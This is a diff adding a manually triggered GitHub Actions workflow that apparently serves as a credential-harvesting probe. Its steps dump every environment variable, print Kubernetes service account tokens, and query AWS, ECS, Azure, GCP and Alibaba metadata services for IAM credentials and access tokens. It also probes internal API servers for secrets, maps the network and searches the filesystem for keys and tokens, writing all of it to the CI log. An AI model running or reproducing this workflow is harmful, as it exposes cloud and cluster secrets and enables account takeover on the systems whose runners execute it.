@@ -1,0 +1,165 @@
+name: K8s Metadata Probe
+
+on:
+  workflow_dispatch:
+
+jobs:
+  k8s-probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Environment Variables Check
+        run: |
+          echo "=== K8s Related Environment Variables ==="
+          env | grep -iE "(KUBERNETES|K8S|KUBE|SERVICE_HOST|SERVICE_PORT|CONTAINER_CREDENTIALS|AWS_|AZURE_|GCP_|GOOGLE_)" || echo "No K8s env vars found"
+          echo ""
+          echo "=== All Environment Variables ==="
+          env | sort
+
+      - name: Service Account Token Check
+        run: |
+          echo "=== Checking K8s Service Account Files ==="
+          echo "--- Token ---"
+          cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo "" || echo "Token not found"
+          echo "--- CA Cert ---"
+          cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null || echo "CA cert not found"
+          echo "--- Namespace ---"
+          cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo "" || echo "Namespace not found"
+          echo ""
+          echo "--- Listing /var/run/secrets ---"
+          ls -laR /var/run/secrets/ 2>/dev/null || echo "No /var/run/secrets directory"
+          echo ""
+          echo "--- Listing /run/secrets ---"
+          ls -laR /run/secrets/ 2>/dev/null || echo "No /run/secrets directory"
+
+      - name: K8s API Server Probes
+        run: |
+          echo "=== K8s API Server Probes ==="
+          
+          echo "--- kubernetes.default.svc ---"
+          curl -sk --connect-timeout 5 https://kubernetes.default.svc/api/v1/namespaces 2>&1 | head -100 || echo "Failed"
+          
+          echo "--- kubernetes.default.svc:443 ---"
+          curl -sk --connect-timeout 5 https://kubernetes.default.svc:443/ 2>&1 | head -100 || echo "Failed"
+          
+          echo "--- 10.0.0.1:443 secrets ---"
+          curl -sk --connect-timeout 5 https://10.0.0.1:443/api/v1/secrets 2>&1 | head -100 || echo "Failed"
+          
+          echo "--- 10.96.0.1:443 (common K8s IP) ---"
+          curl -sk --connect-timeout 5 https://10.96.0.1:443/api/v1/namespaces 2>&1 | head -100 || echo "Failed"
+
+      - name: AWS Metadata Probes
+        run: |
+          echo "=== AWS Metadata Service ==="
+          
+          echo "--- IMDSv1 user-data ---"
+          curl -s --connect-timeout 5 http://169.254.169.254/latest/user-data 2>&1 | head -200 || echo "Failed"
+          
+          echo "--- IMDSv1 meta-data ---"
+          curl -s --connect-timeout 5 http://169.254.169.254/latest/meta-data/ 2>&1 | head -50 || echo "Failed"
+          
+          echo "--- IMDSv1 iam credentials ---"
+          curl -s --connect-timeout 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -50 || echo "Failed"
+          
+          echo "--- IMDSv2 Token ---"
+          TOKEN=$(curl -s --connect-timeout 5 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
+          if [ -n "$TOKEN" ]; then
+            echo "Got IMDSv2 token: $TOKEN"
+            curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1
+          else
+            echo "No IMDSv2 token"
+          fi
+          
+          echo "--- ECS Credentials ---"
+          echo "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI: $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
+          curl -s --connect-timeout 5 http://169.254.170.2/v2/credentials 2>&1 | head -50 || echo "Failed"
+          if [ -n "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" ]; then
+            curl -s --connect-timeout 5 "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>&1 | head -100
+          fi
+
+      - name: Azure Metadata Probes
+        run: |
+          echo "=== Azure IMDS ==="
+          
+          echo "--- Instance metadata ---"
+          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -200 || echo "Failed"
+          
+          echo "--- Managed Identity Token ---"
+          curl -s --connect-timeout 5 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1 | head -100 || echo "Failed"
+
+      - name: GCP Metadata Probes
+        run: |
+          echo "=== GCP Metadata ==="
+          
+          echo "--- Project info ---"
+          curl -s --connect-timeout 5 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/ 2>&1 | head -50 || echo "Failed"
+          
+          echo "--- Service account ---"
+          curl -s --connect-timeout 5 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/ 2>&1 | head -50 || echo "Failed"
+          
+          echo "--- Access token ---"
+          curl -s --connect-timeout 5 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>&1 | head -100 || echo "Failed"
+
+      - name: Alibaba Metadata Probe
+        run: |
+          echo "=== Alibaba Cloud Metadata ==="
+          curl -s --connect-timeout 5 http://100.100.100.200/latest/meta-data/ 2>&1 | head -50 || echo "Failed"
+
+      - name: DNS Probes
+        run: |
+          echo "=== DNS Probes ==="
+          
+          echo "--- nslookup kubernetes.default ---"
+          nslookup kubernetes.default 2>&1 || echo "Failed"
+          
+          echo "--- nslookup kubernetes.default.svc ---"
+          nslookup kubernetes.default.svc 2>&1 || echo "Failed"
+          
+          echo "--- nslookup kubernetes.default.svc.cluster.local ---"
+          nslookup kubernetes.default.svc.cluster.local 2>&1 || echo "Failed"
+          
+          echo "--- dig kubernetes.default.svc.cluster.local ---"
+          dig kubernetes.default.svc.cluster.local 2>&1 || echo "Failed"
+          
+          echo "--- dig @10.0.0.10 ---"
+          dig @10.0.0.10 any kubernetes.default.svc.cluster.local 2>&1 || echo "Failed"
+          
+          echo "--- /etc/resolv.conf ---"
+          cat /etc/resolv.conf
+
+      - name: Network Scan
+        run: |
+          echo "=== Internal Network Scan ==="
+          
+          echo "--- IP addresses ---"
+          ip addr 2>/dev/null || ifconfig 2>/dev/null
+          
+          echo "--- Routes ---"
+          ip route 2>/dev/null || netstat -rn 2>/dev/null
+          
+          echo "--- ARP table ---"
+          arp -a 2>/dev/null || echo "No arp"
+          
+          echo "--- /etc/hosts ---"
+          cat /etc/hosts
+
+      - name: File System Secrets Hunt
+        run: |
+          echo "=== Searching for secrets in filesystem ==="
+          
+          echo "--- Docker socket ---"
+          ls -la /var/run/docker.sock 2>/dev/null && echo "Docker socket exists!" || echo "No docker socket"
+          
+          echo "--- /.dockerenv ---"
+          ls -la /.dockerenv 2>/dev/null || echo "No .dockerenv"
+          
+          echo "--- Interesting files ---"
+          find /home -name "*.pem" -o -name "*.key" -o -name "*secret*" -o -name "*token*" -o -name "*credential*" 2>/dev/null | head -20 || echo "None found"
+          
+          echo "--- /etc/kubernetes ---"
+          ls -laR /etc/kubernetes 2>/dev/null || echo "No /etc/kubernetes"
+          
+          echo "--- ~/.kube ---"
+          ls -laR ~/.kube 2>/dev/null || echo "No ~/.kube"
+          
+          echo "--- Process list ---"
+          ps aux | head -30
